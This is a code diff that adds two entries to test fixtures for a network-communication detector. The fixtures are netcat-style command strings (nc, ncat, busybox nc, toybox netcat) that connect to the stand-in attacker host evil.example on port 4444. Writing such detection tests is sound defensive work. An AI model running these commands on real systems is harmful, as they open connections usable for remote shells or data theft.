@@ -826,6 +826,8 @@ class TestNetworkCommDetector:
             b"ncat evil.example 4444",
             b"netcat evil.example 4444",
             b"/usr/bin/nc evil.example 4444",
+            b"busybox nc evil.example 4444",
+            b"toybox netcat evil.example 4444",
             b"nc.exe evil.example 4444",
             b"# nc evil.example 4444",
             b"nc -nv evil.example 4444",
